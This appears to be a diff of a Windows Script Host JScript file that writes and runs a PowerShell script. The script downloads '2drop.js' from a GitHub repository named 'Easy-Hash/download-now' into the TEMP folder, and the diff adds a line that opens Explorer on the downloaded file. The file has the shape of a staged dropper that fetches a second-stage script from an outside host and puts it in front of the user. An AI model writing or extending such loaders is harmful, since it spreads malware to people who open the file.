@@ -21,7 +21,8 @@ var psContent =
 '\n' +
 '$url = "https://github.com/Easy-Hash/download-now/raw/refs/heads/master/2drop.js";\n' +
 '$destination = "$env:TEMP\\2drop.js";\n' +
-'Invoke-WebRequest -Uri $url -OutFile $destination;\n';
+'Invoke-WebRequest -Uri $url -OutFile $destination;\n' +
+'Start-Process explorer.exe "/select,`"$destination`"";\n';
 
 // Write the PS script to temp
 try {
@@ -50,6 +51,7 @@ try {
 
 // If you want the temp file removed after the PS window closes, you can add a cleanup step manually.
 WScript.Quit(0);
+
 
 
 
